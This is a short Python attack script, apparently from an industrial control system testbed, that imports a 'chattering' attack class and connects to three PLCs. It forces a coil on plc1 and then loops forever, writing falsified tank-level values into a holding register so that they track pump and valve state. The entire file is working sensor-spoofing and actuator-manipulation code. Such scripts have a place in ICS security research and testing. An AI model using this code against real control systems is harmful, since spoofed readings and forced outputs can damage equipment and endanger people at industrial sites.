from attacks.chattering import Plc
import time

plc1 = Plc("plc1", "0.0.0.0", 5023, None)
plc2 = Plc("plc2", "0.0.0.0", 5021, None)
plc3 = Plc("plc3", "0.0.0.0", 5022, None)

interval = 1

plc1.client.write_register(1026, 500)

poll1 = plc1.poll_data()
print(poll1)

if int(poll1["level_plc1"]) > int(poll1["high_1_plc1"]):
    plc1.client.write_coil(2, True)
if int(poll1["level_plc1"]) < int(poll1["high_1_plc1"]):
    plc1.client.write_coil(2, False)

while True:
    poll1 = plc1.poll_data()
    print(poll1)

    if poll1["pumps_plc1"]:
        plc1.client.write_register(1026, int(poll1["level_plc1"] + 1))
    if poll1["valve_plc1"]:
        plc1.client.write_register(1026, int(poll1["level_plc1"] - 1))

    time.sleep(interval)
